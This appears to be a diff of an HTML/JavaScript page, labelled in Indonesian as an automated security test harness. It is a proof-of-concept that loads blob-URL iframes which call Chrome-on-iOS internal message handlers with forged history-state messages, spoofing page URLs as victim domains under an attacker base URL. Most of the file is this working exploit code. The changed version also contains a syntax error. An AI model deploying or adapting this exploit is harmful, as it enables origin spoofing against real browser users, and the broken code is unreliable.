@@ -1,33 +1,33 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Advanced Chained Security Test Harness: Non-Standard URL Validation</title>
+<title>Fully Chained Automated Test Harness: History State Origin Fuzzing</title>
 <style>
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #090d16; color: #f1f5f9; }
-  .wrapper { max-width: 850px; margin: auto; background: #111827; padding: 2em; border-radius: 10px; border: 1px solid #1f2937; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-  h2 { color: #38bdf8; margin-top: 0; font-size: 22px; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #020617; color: #f8fafc; }
+  .wrapper { max-width: 950px; margin: auto; background: #0f172a; padding: 2.5em; border-radius: 14px; border: 1px solid #1e293b; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
+  h2 { color: #38bdf8; margin-top: 0; font-size: 24px; }
   p { line-height: 1.6; color: #94a3b8; font-size: 14px; }
-  .code-box { background: #030712; padding: 1em; border-radius: 6px; border: 1px solid #374151; font-family: monospace; font-size: 12px; color: #38bdf8; margin: 1em 0; }
-  button { font-size: 15px; padding: 0.7em 1.5em; background: #2563eb; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.2s; }
-  button:hover { background: #1d4ed8; }
-  #log { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; white-space: pre-wrap; background: #030712; padding: 1.2em; border-radius: 6px; border: 1px solid #1f2937; color: #a5f3fc; max-height: 350px; overflow-y: auto; }
+  .code-box { background: #020617; padding: 1.2em; border-radius: 8px; border: 1px solid #334155; font-family: monospace; font-size: 12px; color: #38bdf8; margin: 1.2em 0; }
+  button { font-size: 16px; padding: 0.8em 1.8em; background: #6366f1; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: background 0.2s, transform 0.1s; }
+  button:hover { background: #4f46e5; transform: translateY(-1px); }
+  button:active { transform: translateY(0); }
+  #log { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.8em; white-space: pre-wrap; background: #020617; padding: 1.4em; border-radius: 8px; border: 1px solid #1e293b; color: #38bdf8; max-height: 450px; overflow-y: auto; }
   .highlight { color: #facc15; font-weight: bold; }
-  .step-indicator { color: #f43f5e; font-weight: bold; }
+  .chain-badge { color: #ec4899; font-weight: bold; }
+  .success-badge { color: #22c55e; font-weight: bold; }
 </style>
 
 <div class="wrapper">
-  <h2>Chained Origin Validation Test Harness</h2>
-  <p>Rangkaian pengujian otomatis ini menjalankan <span class="highlight">Multi-Vector Chaining</span> untuk mengevaluasi ketahanan validasi origin terhadap berbagai skema URL non-standard secara berurutan.</p>
+  <h2>Full-Chain Automated Security Test Harness</h2>
+  <p>Rangkaian ini mengeksekusi <span class="highlight">Full-Chain Execution Loop</span> secara otomatis untuk menguji seluruh vektor mutasi skema non-standard dari awal hingga akhir siklus pengujian.</p>
   
   <div class="code-box">
-    Vektor Rantai Pengujian:<br>
-    - Tahap 1: Evaluasi Skema Blob URL Lintas Origin<br>
-    - Tahap 2: Evaluasi Skema Data / Opaque Origin<br>
-    - Tahap 3: Verifikasi Konsistensi Respon Native Bridge
+    Status Rantai Otomatis:<br>
+    - Auto-Initialization → Sequential Frame Injection → Response Synchronization → Complete Cleanup
   </div>
 
-  <button id="launchChainBtn">Jalankan Rantai Pengujian Penuh</button>
+  <button id="startFullChainBtn">Mulai Rantai Otomatis Penuh</button>
   
-  <div id="log">Status: Menunggu inisialisasi rantai pengujian...</div>
+  <div id="log">Status: Menunggu eksekusi rantai dimulai...</div>
 </div>
 
 <script>
@@ -37,24 +37,39 @@ function appendLog(message) {
     logEl.scrollTop = logEl.scrollHeight;
 }
 
-document.getElementById('launchChainBtn').onclick = function() {
-    document.getElementById('log').textContent = 'Memulai eksekusi rantai pengujian multi-vektor...';
+document.getElementById('startFullChainBtn').onclick = function() {
+    document.getElementById('log'].textContent = 'Inisialisasi rangkaian full-chain otomatis...';
     
-    var targetDomains = ['secure-alpha.local', 'secure-beta.local'];
-    var currentStep = 0;
+    var mutationVectors = [
+        { name: "Blob Standard Cross-Origin", url: "blob:https://victim-alpha.com/uuid-chain-1" },
+        { name: "Blob Nested / Subdomain", url: "blob:https://sub.victim-beta.com/uuid-chain-2" },
+        { name: "Opaque Scheme Variant", url: "blob:null/uuid-chain-3" },
+        { name: "Data URI Variant", url: "data:text/html,<html></html>" },
+        { name: "Malformed Protocol Prefix", url: "blobblob:https://victim-alpha.com/" }
+    ];
 
-    function executeNextVector() {
-        if (currentStep >= targetDomains.length) {
-            appendLog('\n[SELESAI] Seluruh tahap rantai pengujian multi-vektor telah dieksekusi.');
+    var vectorIndex = 0;
+    var activeIframe = null;
+
+    function cleanupCurrentFrame() {
+        if (activeIframe && activeIframe.parentNode) {
+            activeIframe.parentNode.removeChild(activeIframe);
+            activeIframe = null;
+        }
+    }
+
+    function runNextChainStep() {
+        if (vectorIndex >= mutationVectors.length) {
+            appendLog('\n<span class="success-badge">[SELESAI TOTAL]</span> Seluruh rantai pengujian mutasi berhasil dieksekusi secara end-to-end.');
             return;
         }
 
-        var domain = targetDomains[currentStep];
-        var testUrl = 'blob:https://' + domain + '/session-' + Math.random().toString(36).substring(7);
-        
-        appendLog('\n<span class="step-indicator">--- Menjalankan Tahap ' + (currentStep + 1) + ' ---</span> Target Domain: ' + domain);
+        cleanupCurrentFrame();
 
-        var payloadCode = `<!doctype html>
+        var currentVector = mutationVectors[vectorIndex];
+        appendLog('\n<span class="chain-badge">[Rantai Langkah ' + (vectorIndex + 1) + '/' + mutationVectors.length + ']</span> Memproses: ' + currentVector.name);
+
+        var payloadSource = `<!doctype html>
         <meta charset=utf-8>
         <script>
         (function() {
@@ -62,84 +77,89 @@ document.getElementById('launchChainBtn').onclick = function() {
                 var bridge = window.webkit && window.webkit.messageHandlers;
                 if (!bridge || !bridge.NavigationEventMessage) {
                     parent.postMessage({
-                        step: ${currentStep + 1},
+                        step: ${vectorIndex},
                         status: 'SECURE_PROTECTED',
-                        details: 'Proteksi aktif pada tahap ${currentStep + 1}: Validasi aman terdeteksi.'
+                        details: 'Proteksi aktif: Jembatan pesan internal aman / tidak terekspos.'
                     }, '*');
                     return;
                 }
 
-                var frameId = null;
+                var fId = null;
                 try {
-                    frameId = window.__gCrWeb && window.__gCrWeb.getFrameId();
+                    fId = window.__gCrWeb && window.__gCrWeb.getFrameId();
                 } catch(e) {}
 
-                if (!frameId) {
+                if (!fId) {
                     parent.postMessage({
-                        step: ${currentStep + 1},
+                        step: ${vectorIndex},
                         status: 'SECURE_PROTECTED',
-                        details: 'Isolasi konteks berhasil dipertahankan.'
+                        details: 'Isolasi frame berhasil dikonfirmasi.'
                     }, '*');
                     return;
                 }
 
                 try {
-                    bridge.NavigationEventMessage.postMessage({ command: 'willChangeState', frame_id: frameId });
+                    bridge.NavigationEventMessage.postMessage({ command: 'willChangeState', frame_id: fId });
                     bridge.NavigationEventMessage.postMessage({ 
                         command: 'didReplaceState', 
-                        frame_id: frameId, 
+                        frame_id: fId, 
                         stateObject: '', 
-                        baseUrl: 'https://attacker.local/', 
-                        pageUrl: '${testUrl}' 
+                        baseUrl: 'https://attacker-chain.local/', 
+                        pageUrl: '${currentVector.url}' 
                     });
 
                     parent.postMessage({
-                        step: ${currentStep + 1},
-                        status: 'VECTOR_SIGNAL_SENT',
-                        details: 'Sinyal terkirim untuk URL: ${testUrl}'
+                        step: ${vectorIndex},
+                        status: 'CHAIN_SIGNAL_PROCESSED',
+                        details: 'Sinyal berhasil dikirim untuk URL: ${currentVector.url}'
                     }, '*');
                 } catch(err) {
                     parent.postMessage({
-                        step: ${currentStep + 1},
+                        step: ${vectorIndex},
                         status: 'ERROR',
                         details: err.message
                     }, '*');
                 }
-            }, 200);
+            }, 100);
         })();
         <\/script>`;
 
         try {
-            var blob = new Blob([payloadCode], { type: 'text/html' });
-            var blobUrl = URL.createObjectURL(blob);
+            var blobObj = new Blob([payloadSource], { type: 'text/html' });
+            var blobUrl = URL.createObjectURL(blobObj);
 
-            var messageHandler = function(e) {
-                if (e.data && e.data.step === (currentStep + 1)) {
-                    appendLog('Hasil Tahap ' + e.data.step + ': ' + e.data.status);
-                    appendLog('Detail: ' + e.data.details);
+            var stepTimeout = setTimeout(function() {
+                appendLog('Peringatan: Timeout tercapai pada langkah ' + (vectorIndex + 1) + '. Melanjutkan rantai...');
+                window.removeEventListener('message', messageHandler);
+                vectorIndex++;
+                runNextChainStep();
+            }, 2500);
+
+            var messageHandler = function(evt) {
+                if (evt.data && evt.data.step === vectorIndex) {
+                    clearTimeout(stepTimeout);
+                    appendLog('Hasil Langkah #' + (evt.data.step + 1) + ': ' + evt.data.status);
+                    appendLog('Detail: ' + evt.data.details);
                     window.removeEventListener('message', messageHandler);
                     
-                    // Lanjut ke tahap berikutnya dalam rantai
-                    currentStep++;
-                    setTimeout(executeNextVector, 500);
+                    vectorIndex++;
+                    setTimeout(runNextChainStep, 300);
                 }
             };
             window.addEventListener('message', messageHandler);
 
-            appendLog('Mengarahkan ke vector URL: ' + blobUrl);
-            // Simulasikan navigasi atau evaluasi beruntun
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = blobUrl;
-            document.body.appendChild(iframe);
+            activeIframe = document.createElement('iframe');
+            activeIframe.style.display = 'none';
+            activeIframe.src = blobUrl;
+            document.body.appendChild(activeIframe);
 
-        } catch (ex) {
-            appendLog('Gagal pada tahap ' + (currentStep + 1) + ': ' + ex.message);
-            currentStep++;
-            setTimeout(executeNextVector, 500);
+        } catch (exc) {
+            appendLog('Kesalahan pada langkah ' + (vectorIndex + 1) + ': ' + exc.message);
+            vectorIndex++;
+            setTimeout(runNextChainStep, 300);
         }
     }
 
-    executeNextVector();
+    runNextChainStep();
 };
 </script>
